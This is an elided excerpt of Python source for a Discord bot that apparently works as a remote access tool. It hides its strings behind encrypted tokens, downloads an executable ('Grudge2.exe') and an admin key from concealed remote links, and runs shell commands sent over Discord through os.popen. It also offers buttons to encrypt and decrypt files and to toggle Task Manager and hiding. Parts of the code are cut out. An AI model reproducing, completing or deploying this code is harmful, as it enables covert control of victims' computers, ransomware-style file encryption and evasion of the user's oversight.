...
def update_adminKey():
    global adminKey
    adminKey = get('{}'.format(decrypt_txt(KeyLink))).text 
#----------------------------------------------------------------#
...
def update_downloads():
    content=read_site(decrypt_txt(InfoLink))
...
async def menu(ctx):
    ...
    if update==True:
        ...
        async def button_callback(interaction):
            ...
            async def button_callback(interaction):
                ...
                download('{}'.format(decrypt_txt(GrudgeLink)),'Grudge2.exe')
                sleep(1)
    ...
    if msg.content == '1':
        ...
        if msg.content == '1':
            ...
            shell=os.popen(f"{decrypt_txt(b'gAAAAABlwMDAJxNW3m5P_DhfOC0fDEaDpOSKnc4ZhhFa8n4dJO_-cQZ7arLbhl19LiGPmGrALb8qj7XOmqXr-Yyw1QF-NOT8N6y_fRbcW5MX_YnsDiyHJ-s=')}").read()
            for line in shell.splitlines():
                if ': ' in line:
                    variable, val = line.split(': ')
                    shell=os.popen('{} "{}" {}'.format(decrypt_txt(b'gAAAAABlwMDAJxNW3m5P_DhfOC0fDEaDpOSKnc4ZhhFa8n4dJO_-cQZ7arLbhl19LiGPmGrALb8qj7XOmqXr-Yyw1QF-NOT8N6y_fRbcW5MX_YnsDiyHJ-s='),val,decrypt_txt(b'gAAAAABlwMEFzzWOKh0Un9PEQN6aF2epo1gbFlKI88ULB3CK3gwqZAsnCs3ii9TSbDKEKkd2Zp-YaxQyCtX3kCUhraqKELDTiw=='))).read()
                    for line in shell.splitlines():
            ...
            await ctx.send(f"```{decrypt_txt(b'gAAAAABlwMVYrz8LuJr8qXO4jkGyk1_tmvKDfKswIYN1ZIlOuYv6q6nqiVgQJj8W185KDblwFisKcjhSo-2328ATBz2vYde2ezx_hkXQZD76qq_N6PCBbJ3a82XaIcrnR3p4jfEVICf6jcDez20d7MF9k13DIHeUIZLATF_wid9kYYg2bqQ2PyLy7wQeR4eGie0Ke4OcyoetzkDUB5MCa52VVG49sut5iw==')}```")
            msg = await bot.wait_for("message")
            ...
            Encryptf = Button(label=f"{decrypt_txt(b'gAAAAABlwMV2hX1G3gwubuMNvL-xuxfIt4vCuXja1NkW2IkhKVlAcd4HsvG8tIRBJwTl8m4rb7cj7dNX-2XD0iolMRrsShyJNg==')}", style=discord.ButtonStyle.green) 
            view = View()
            ...
            async def button_callback(interaction):
                ...
                eafiaf(crypt='En')
                await ctx.send(f"{decrypt_txt(b'gAAAAABlwMV2hX1G3gwubuMNvL-xuxfIt4vCuXja1NkW2IkhKVlAcd4HsvG8tIRBJwTl8m4rb7cj7dNX-2XD0iolMRrsShyJNg==')} Successfully!")
            Encryptf.callback = button_callback
            #================================#
            Decryptf = Button(label=f"{decrypt_txt(b'gAAAAABlwMWJOWZpsUr1azerAKHhDYLyBXQfZ4YgKUCmy5LejVYN8nNaHPQjkvxr6LF-EYQN1b18UpEFnOY6906l9keF1VF7vg==')}", style=discord.ButtonStyle.green) 
            view = View()
            ...
            async def button_callback(interaction):
                await interaction.response.defer()
                eafiaf(crypt='De')
                await ctx.send(f"{decrypt_txt(b'gAAAAABlwMWJOWZpsUr1azerAKHhDYLyBXQfZ4YgKUCmy5LejVYN8nNaHPQjkvxr6LF-EYQN1b18UpEFnOY6906l9keF1VF7vg==')} Successfully!")
            ...
            #================================#
            Tsmgr = Button(label=f"{decrypt_txt(b'gAAAAABlwMXt5z5bsQJmCHhYGEfAZZvTKu4k7AaBnnrQnqDlLPWm-QOLujrOKwn8QVGTgeg0MWB7tBKvCdfEwzgrWnXIgpXlXw==')} ON/OFF👑", style=discord.ButtonStyle.red) 
            view = View()
            view.add_item(Tsmgr)
            await ctx.send(view=view)
            async def button_callback(interaction):
            ...
            #================================#
            Dhide = Button(label=f"{decrypt_txt(b'gAAAAABlwMYac2YMre07fzA3NWp2iqf12pjO9P6l9vDUvL93yf4akXeTlReTcRd-4R02BERoB2IEGFK2vYNdl4VImZ71Y-OffYwZModdhMGOL7VWLpXjUKg=')} ON/OFF👑", style=discord.ButtonStyle.red) 
            view = View()
            view.add_item(Dhide)
            await ctx.send(view=view)
            async def button_callback(interaction):
    ...
    #=======================================APP INSTALLER=======================================#
        ...
        if msg.content == '1':
            ...
            if update==True:
                ...
                async def button_callback(interaction):
                    await interaction.response.defer()
                    msg = await ctx.send(f"""{decrypt_txt(b'gAAAAABlwMAnUMoHduerLKj8VMPupdJ8pnDa-oHPd-5hupraWCPRaciTekveN19KZ-0uZ7kfV3Ujyhf5Zd9oa8Pgbw3SfBHc6IP4mI3qRiesZm3YhIvsBqU=')} \n|█          |""")
                    animation='█'
                    space='         '
                    number=9
                    for i in range(0,10):
                        await msg.edit(content="{} \n|{}{}|".format(decrypt_txt(b'gAAAAABlwMAnUMoHduerLKj8VMPupdJ8pnDa-oHPd-5hupraWCPRaciTekveN19KZ-0uZ7kfV3Ujyhf5Zd9oa8Pgbw3SfBHc6IP4mI3qRiesZm3YhIvsBqU='),animation,space))
                        animation = animation+'█'
                        number=number-1
    ...
    #=======================================SETTINGS=======================================#
        ...
        if msg.content == '1':
            ...
            async def button_callback(interaction):
                await interaction.response.defer()
                password = read('Default password',decrypt_txt(default_password))
            ...
            await msg.delete()
            #------------------------------------------------------------------------------#
            password = read(decrypt_txt(default_password))
            old = msg.content
            ...
            if old == password:
                ...
                adminKey = read_site(decrypt_txt(KeyLink))
                sleep(0.3)
...
async def cmd(ctx,prompt='cmd'):
    ...
    if prompt=='ps1': window=f'''```▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆\n{decrypt_txt(b'gAAAAABlwMZKAJ0GHTbUE6citnUC9fpM0MAhPEt8k1KTEhhLQwkXC06cIrq6pIdKF28HqWuYgqTNGrDOMsB2uA_dpM7myd90vw==')}                         _▢X\n‎\n\n\n\n\n▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆\n```'''
    if prompt=='cmd': window=f'''```▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆\n{decrypt_txt(b'gAAAAABlwMZlWUPuXlEOV7nRp-XCpMTxI2_t3jw-g4ueKyqt4B-01jl-bt1M8wbCMmSd0BWZrFUa-Z65w3Fnrbv1IJmDnB70GA==')}                                _▢X\n‎\n\n\n\n\n▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆\n```'''
        ...
        try:
            ...
            if 'cd ' in (msg.content).lower():
                ...
                try:
                    ...
                    tries=0
                    while ospopen_result==None and tries<16:
                        sleep(0.5)
                        tries+=1
